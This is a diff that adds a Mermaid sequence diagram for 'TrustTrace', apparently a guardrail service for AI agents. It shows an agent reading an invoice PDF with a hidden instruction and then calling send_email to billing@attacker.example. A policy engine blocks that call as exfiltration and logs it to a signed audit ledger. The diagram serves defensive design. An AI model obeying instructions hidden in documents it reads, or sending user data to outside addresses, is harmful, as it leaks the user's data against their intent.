@@ -1,0 +1,23 @@
+sequenceDiagram
+  autonumber
+  actor User
+  participant Agent as AI agent
+  participant API as TrustTrace API
+  participant Pol as Policy engine
+  participant Jdg as Gemini judge (optional)
+  participant Led as Signed ledger
+  participant Tool as Sandbox mock tool
+  participant Dash as Dashboard
+
+  User->>Agent: "Summarize this vendor invoice"
+  Agent->>Agent: reads invoice_4471.pdf (hidden instruction)
+  Agent->>API: POST /v1/execute send_email billing@attacker.example
+  API->>Pol: validate strict schema, then run rules
+  Pol-->>API: BLOCK risk 1.0 sensitive_data, unapproved_destination, exfiltration, untrusted_context_instruction
+  Note over API,Jdg: Deterministic BLOCK short-circuits. The judge is never asked and cannot override.
+  API->>Led: append event, hash-chain it, sign with Ed25519
+  API--xTool: not executed
+  API-->>Agent: BLOCK plus findings and source invoice_4471.pdf
+  Dash->>Led: GET /v1/audit/verify
+  Led-->>Dash: chain valid, signatures valid
+  User->>Dash: Export JSON evidence report
